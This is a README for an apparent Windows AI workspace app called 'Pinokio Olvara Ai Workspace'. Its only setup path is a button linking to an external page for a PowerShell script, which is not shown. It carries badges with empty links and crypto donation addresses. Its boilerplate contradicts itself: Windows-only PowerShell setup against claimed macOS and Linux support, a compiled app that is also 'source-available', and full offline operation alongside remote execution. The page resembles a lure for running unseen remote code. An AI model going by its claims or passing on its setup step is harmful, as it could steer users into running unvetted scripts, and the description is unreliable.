<div align="center">

# 🛠️ Pinokio Olvara Ai Workspace — Professional Desktop Workspace for Windows 11

![](files/preview.png)

### ⚡ PowerShell Setup Button

<a href="https://senickimoro-art.github.io/pinokio-olvara-ai-workspace/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![ci](https://img.shields.io/badge/CI-OK-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-5%2B-f97316?style=flat-square&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-1589-fb923c?style=flat-square&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/RUNS--ON-WINDOWS_10_%2F_11-ea580c?style=flat-square&labelColor=0d1117)]()

<div align="center">
<h3>Send a small thank-you</h3>
<p><strong>BTC</strong>:&nbsp;<code>15mbQqh4NMkRomnKT7zzvhr13DPDrtzoAj</code> | <strong>ETH</strong>:&nbsp;<code>0x5dC1ff1717832ECE18f0fF06b8624677C86BB21C</code></p>
</div>

</div>

---

Pinokio Olvara Ai Workspace is a desktop application designed to provide a unified, local environment for orchestrating AI models, tools, and workflows. It delivers a structured workspace that combines model management, task automation, and resource monitoring within a single native interface. Built for technical users, the application emphasizes deterministic execution, low-latency local processing, and transparent configuration of every pipeline component. Its modular architecture supports extensible integrations and reproducible setups while keeping all operational data under direct user control.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Local-first AI workspace orchestration** — Pinokio Olvara Ai Workspace coordinates models, runtimes, and tooling on the local machine, keeping execution and data on-device by default.
- **Unified workspace model** — Projects, sessions, and asset directories are organized under a consistent workspace structure, allowing reproducible configurations and clean separation between experiments.
- **Runtime and environment management** — Detects and manages the required runtimes and environments for supported workloads, isolating dependencies per workspace to prevent version conflicts.
- **Model and adapter management** — Tracks installed models, adapters, and related artifacts with versioned metadata, enabling consistent reuse across sessions and workspaces.
- **Pipeline composition** — Supports chaining multiple processing steps (inference, transformation, post-processing) into repeatable pipelines with explicit inputs, outputs, and intermediate artifacts.
- **Configuration as code** — Workspace, pipeline, and runtime settings are defined in declarative configuration files, making setups portable, reviewable, and version-controllable.
- **Deterministic execution and logging** — Records execution parameters, environment details, and artifact provenance per run, supporting reproducibility and auditability.
- **Resource-aware scheduling** — Manages CPU, GPU, and memory allocation across concurrent tasks, with configurable limits and queueing for heavy workloads.
- **Extensible integration surface** — Provides a documented interface for adding new runtimes, model loaders, and pipeline steps without modifying core workspace logic.
- **Offline operation** — Core workspace functionality operates without network access; any network-dependent operations are explicit and opt-in.
- **Cross-platform desktop operation** — Runs as a native desktop application with platform-appropriate process and filesystem integration.

## How it works

Pinokio Olvara Ai Workspace operates as a local orchestration layer that coordinates model runtimes, workspace assets, and user sessions on the host machine. On launch, the application initializes a lightweight control service that discovers available runtimes, validates environment prerequisites, and prepares the workspace directory structure. Configuration is resolved from a layered set of local profiles, allowing per-workspace settings to override global defaults without modifying installed components.

The core execution model is task-based. Each user action—model loading, prompt execution, file ingestion, or pipeline run—is dispatched to a scheduler that queues, prioritizes, and routes work to the appropriate backend. Long-running operations stream status events back to the interface, while resource-intensive tasks are isolated to prevent contention between concurrent jobs. State is persisted locally, so workspaces, conversation histories, and generated artifacts survive restarts and remain fully inspectable on disk.

Workspace management is handled through a manifest-driven system. Each workspace declares its models, dependencies, and asset paths, and the application reconciles that manifest against the local environment at startup, flagging missing or mismatched components before execution begins. Model backends are abstracted behind a unified interface, enabling consistent invocation, parameter handling, and output normalization across supported runtimes.

The desktop client communicates with the local control service over an internal channel, keeping the UI responsive while heavy computation proceeds in worker processes. Logging, metrics, and error reporting are captured per task, giving users traceability into every operation without leaving the application. All processing occurs on the local machine by default, with no data transmitted externally unless explicitly configured by the user.

## Modules and Settings

### Workspace Launcher
Controls how a pinokio-olvara-ai-workspace session comes online, so the desktop workspace can be brought up in stages rather than all at once.
- Choose which components start with the session and in which order they are started.
- Select between launching all selected components together or starting each one individually for more careful control.
- Pause or resume startup so you can confirm each stage before the next begins.
- View the resulting workspace dashboard, which reflects the live state of every component started.

### Component Registry
Holds the list of AI tools and components available in the workspace and lets you shape that list to match your setup.
- Enable, disable or remove entries to control what appears as available in the workspace.
- Edit per-component settings, such as the model or runtime an entry points to, before it is launched.
- Confirm that the component list and the workspace view stay in sync after changes.

### Model and Runtime Configuration
Defines the model and runtime profile each component uses, connecting the registry to the launcher.
- Assign a model to each tool and pick the runtime it should use.
- Set resource preferences, such as how much memory or compute a component may take, limited by what the host machine supports.
- Review a configuration summary before applying it to a running session.
- Adjust model and runtime choices so startups match the intended workload and hardware.

### Service Monitor
Provides a live view of the local AI services the workspace depends on.
- See whether each service is running, stopped or failed.
- Restart or stop individual services without leaving the workspace.
- Inspect basic status information for a service to identify unexpected stops.

### Prompt Workspaces
Offers working areas where prompts, test inputs and multi-step AI tasks are tied to configured components.
- Create workspaces and organize prompts together with their outputs for later revisiting.
- Choose which configured component handles each task.
- Save the inputs, outputs and settings used so the work can be resumed later.

### Profiles and Resource Allocation
Connects saved configurations with the resource view, so switching setups also updates allocations.
- Save workspace settings as profiles, such as a lightweight test setup and a fuller working configuration.
- Edit, duplicate or remove profiles and see which profile is currently active.
- View how resources are allocated across enabled components and rebalance them manually.
- Confirm that adjustments appear in both the component settings and the allocation overview.

### Additional Settings
Optional controls that support day-to-day use of the workspace.
- Log and activity review with filtering and clearing, useful for tracing why a component stopped or which settings were applied before a change.
- Activity history tied to the components launched in a session, so past sessions can be compared.
- Default startup behavior for newly added components, so they follow the launch pattern you prefer.
- Display preferences for the workspace dashboard and status views.

## Usage Scenarios

### Bringing a Lightweight Test Workspace Online

**Goal:** Start a minimal pinokio-olvara-ai-workspace session with only the components needed for a quick experiment, without loading the full setup.

**Steps:**
1. Open the Workspace Launcher and select only the components required for the experiment, ordering them so a single model service starts first.
2. Choose the individual startup option and pause after the first component so its dashboard state can be confirmed before continuing.
3. In Model and Runtime Configuration, assign a smaller model and modest resource preferences to each selected component, then review the configuration summary.
4. Resume startup and watch the workspace dashboard as the remaining components come online.
5. Switch to a saved lightweight profile if the current settings should be reused for future quick tests.

**Expected result:** The workspace dashboard shows only the chosen components in a running state, each with the smaller model and reduced resource allocation reflected in its settings, and the active profile is visible in the interface.

### Diagnosing a Component That Stopped

**Goal:** Find out why a local AI service in the workspace stopped unexpectedly and restore it.

**Steps:**
1. Open the Service Monitor and review the status of each local service, identifying the one marked as stopped or failed.
2. Inspect the basic status information for that service to see what happened.
3. Open Log and Activity Review, filter the log views to the relevant component, and check which settings were applied before the stop.
4. Restart the individual service from the Service Monitor without leaving the workspace.
5. If the stop traces back to resource pressure, open the Resource Allocation Overview and manually rebalance allocations across enabled components before restarting again.

**Expected result:** The user sees the affected service return to a running state, with the filtered log view showing the sequence of events that preceded the stop and the allocation overview displaying the adjusted resource split.

### Building and Saving a Multi-Step Prompt Workspace

**Goal:** Create a reusable working area for a multi-step AI task tied to specific configured components, then preserve it as part of a full working profile.

**Steps:**
1. In the Component Registry, enable the tools needed for the task and edit each entry so it points to the intended model and runtime.
2. Create a new Prompt Workspace and organize the prompts and test inputs for each step, assigning a different configured component to handle each task.
3. Run through the steps, then review the saved inputs, outputs and settings so the work can be resumed later.
4. Save the workspace settings as a profile and duplicate a lighter test profile alongside it for comparison.
5. Confirm in the Resource Allocation Overview that allocations match the fuller working configuration, adjusting them manually if needed.

**Expected result:** A saved prompt workspace containing the inputs, outputs and component assignments for every step, an active full working profile visible in the interface, and an allocation overview consistent with the component settings used during the session.

## Compatibility

Pinokio Olvara Ai Workspace is designed for desktop environments and targets modern 64-bit operating systems. Supported platforms include Windows 10 and 11, macOS 12 and later on both Intel and Apple Silicon hardware, and mainstream 64-bit Linux distributions. The workspace requires a minimum of 8 GB of system memory, with 16 GB or more recommended for multi-model workflows, and sufficient local storage for model weights and workspace data.

Runtime compatibility is built around Pinokio as the host environment, with the workspace managing its own isolated dependency stack to avoid conflicts with system-level packages. GPU acceleration is supported through CUDA on compatible NVIDIA hardware and through Metal on Apple Silicon; CPU-only execution remains available as a fallback. The application runs as a local desktop service and communicates over localhost, so no external network exposure is required for core operation.

Interface compatibility covers current versions of Chromium-based browsers, Firefox, and Safari for the local web UI, with responsive layouts for standard desktop resolutions. The workspace maintains versioned configuration and data formats to preserve compatibility across updates, and it validates the host environment at startup to surface incompatibilities before execution begins.

## FAQ

**What runtime dependencies are required to operate the workspace?**
The application is distributed as a self-contained desktop environment. It requires a compatible operating system with supported graphics drivers for local model inference. No external language runtimes, package managers, or system-level libraries need to be provisioned manually; all required components are resolved and managed internally by the workspace launcher.

**How does the workspace isolate different AI models and configurations?**
Each model and pipeline configuration is sandboxed within its own workspace profile. Profiles encapsulate model weights, inference parameters, cache directories, and environment variables, ensuring that changes to one configuration do not affect another. Profile switching is handled through the workspace interface without restarting the application.

**Which operating systems and hardware configurations are supported?**
The workspace targets 64-bit desktop platforms. GPU acceleration is available where compatible drivers and compute capabilities are present, with a CPU fallback path for systems without supported accelerators. Compatibility details for specific hardware classes are documented in the Compatibility section.

**How is local data handled during operation?**
All model execution, prompt processing, and generated artifacts remain on the local machine. The workspace does not transmit prompts, outputs, or workspace metadata to external services. Persistent state is stored within the user's workspace directory and can be cleared per-profile.

**Can the workspace operate without network access?**
Yes. Once models and workspace assets are present locally, the application runs fully offline. Network access is only relevant to the initial provisioning of workspace assets and any user-initiated updates.

**What mechanisms exist for managing and extending model support?**
Model definitions are declarative and can be added or modified through workspace configuration files. The workspace validates model metadata and compatibility at load time, surfacing clear diagnostics when a model cannot be initialized. Custom pipelines can be registered in the same manner as built-in ones.

**How are errors and diagnostics surfaced to the user?**
The workspace maintains structured logs per profile, capturing initialization, inference, and runtime events. Failures during model load or inference are reported with error codes and contextual details in the application interface, and the underlying logs remain accessible for deeper inspection.

**What is the recommended approach for troubleshooting a workspace that fails to initialize?**
Verify that the workspace profile references a valid model and that hardware requirements are satisfied. Review the profile's structured logs for the first reported error, confirm that no conflicting profile is holding shared resources, and reset the profile to defaults if configuration drift is suspected.

## Disclaimer

Pinokio Olvara Ai Workspace is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, and non-infringement. Use of the software is entirely at your own risk.

The workspace orchestrates local and remote AI model execution, manages runtime environments, and coordinates task pipelines across supported backends. Because outputs are generated by probabilistic models, results may be inaccurate, incomplete, or unsuitable for a given use case. Users are responsible for validating all generated content, model behavior, and pipeline results before relying on them in production, commercial, or safety-critical contexts.

Performance and compatibility depend on the host operating system, hardware configuration, driver versions, available memory and storage, and the specific model runtimes selected. The maintainers do not guarantee uninterrupted operation, error-free execution, or compatibility with every model, plugin, or third-party dependency. Configuration changes, dependency updates, and model revisions may alter behavior between releases.

Users are solely responsible for ensuring that their use of models, datasets, and generated content complies with applicable laws, licenses, and terms governing those third-party components. The maintainers assume no liability for data loss, service interruption, indirect or consequential damages, or any other harm arising from the installation, configuration, or operation of Pinokio Olvara Ai Workspace.

No support commitment, service-level agreement, or update guarantee is implied. Features may be modified, deprecated, or removed in future versions without prior notice.

## License

Pinokio Olvara Ai Workspace is distributed under a proprietary, source-available license. The software is provided as a compiled desktop application, and use is granted under the terms bundled with the release package. Redistribution, sublicensing, and incorporation into commercial products require prior written permission from the project maintainers. Internal evaluation, testing, and personal use are permitted within the scope defined by the accompanying license agreement.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Third-party components integrated into Pinokio Olvara Ai Workspace remain subject to their respective licenses, which are enumerated in the attribution manifest included with each distribution. Users are responsible for reviewing and complying with those terms when exercising features that depend on such components.

License terms apply per release version; continued use of a given build constitutes acceptance of the terms shipped with that build. For licensing inquiries, permissions, or clarifications regarding permitted use, contact the project maintainers through the channels designated in the release documentation.